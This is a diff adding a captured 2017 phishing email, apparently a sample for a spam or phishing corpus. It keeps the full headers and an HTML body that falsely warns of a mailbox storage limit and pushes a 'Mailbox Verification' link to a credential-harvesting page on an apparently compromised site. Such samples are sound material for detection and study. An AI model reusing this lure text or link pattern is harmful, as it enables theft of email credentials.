@@ -1,0 +1,69 @@
+Received: from unknown (HELO mail.whoisprotection.biz) (93.89.230.9)
+  by 0 with SMTP; 21 Oct 2017 14:03:57 -0000
+Received-SPF: unknown (0: domain at spf-trusted-fwd1.surgate.net does not designate permitted sender hosts)
+Received: with MailEnable Postoffice Connector; Sat, 21 Oct 2017 17:03:44 +0300
+Received: from ([127.0.0.1]) with MailEnable ESMTP; Sat, 21 Oct 2017 17:03:42 +0300
+Received: from dhfmedia by evolution.hostland.co.uk with local (Exim 4.89)
+	(envelope-from <dhfmedia@evolution.hostland.co.uk>)
+	id 1e5uNL-0008MW-Lt
+	for abuse@domaintime.biz; Sat, 21 Oct 2017 10:03:43 -0400
+To: ---------- <abc@example.com>
+Subject: Mailbox Notification
+X-PHP-Script: dhfmedia.club/postbill.php for 41.190.2.249
+X-PHP-Originating-Script: 665:postbill.php
+MIME-Version: 1.0
+Content-type: text/html; charset=iso-8859-1
+From: Mail Administrator <support@mail-server.com>
+Reply-To: ---------- <abc@example.com>
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-Mailer: dhfmedia.club
+Message-Id: <E1e5uNL-0008MW-Lt@evolution.hostland.co.uk>
+Date: Sat, 21 Oct 2017 10:03:43 -0400
+X-AntiAbuse: This header was added to track abuse, please include it with any abuse report
+X-AntiAbuse: Primary Hostname - evolution.hostland.co.uk
+X-AntiAbuse: Original Domain - domaintime.biz
+X-AntiAbuse: Originator/Caller UID/GID - [665 497] / [47 12]
+X-AntiAbuse: Sender Address Domain - evolution.hostland.co.uk
+X-Get-Message-Sender-Via: evolution.hostland.co.uk: authenticated_id: dhfmedia/only user confirmed/virtual account not confirmed
+X-Authenticated-Sender: evolution.hostland.co.uk: dhfmedia
+X-Source: /opt/cpanel/ea-php56/root/usr/bin/php-cgi
+X-Source-Args: /opt/cpanel/ea-php56/root/usr/bin/php-cgi 
+X-Source-Dir: dhfmedia.club:/public_html
+X-Envelope-Sender: dhfmedia@evolution.hostland.co.uk
+X-ME-Bayesian: 0.000000
+
+<html>
+
+<head>
+<meta name="GENERATOR" content="Microsoft FrontPage 5.0">
+<meta name="ProgId" content="FrontPage.Editor.Document">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>New Page 1</title>
+</head>
+
+<body>
+
+<p class="style3">Dear abuse@domaintime.biz
+</p>
+<p class="style3">You have reached your mailbox storage bandwidth limit.</p>
+<p class="style3">Most of your incoming mails will be placed on hold.</p>
+<p class="style3">You are required to run a quick verification now.</p>
+<table width="200">
+  <tr align="left" bgcolor="#000000">
+    <td style="text-align: center; padding-left: 20px; padding-right: 20px; padding-top: 2px; padding-bottom: 5px; background-color: #000000" width="405">
+    <p class="style4" align="center">
+    <a class="style5" style="font-size: 17px; color: #fff; text-align: center; text-decoration: none" href="https://www.bise-ctg.gov.bd/Webmail/Mailbox/webmail.php?email=abuse@domaintime.biz
+&.rand=13vqcr8bp0gud&lc=1033&id=64855&mkt=en-us&cbcxt=mai&snsc=1" target="_blank">
+    Mailbox Verification</a></td>
+  </tr>
+</table>
+<p><span class="style3">No further action is required.<br></p>
+</span></p>
+<p class="style3"></div>
+<p class="style2"><span class="style3">Mail Administrator</span></div>
+
+</body>
+
+</html>
+
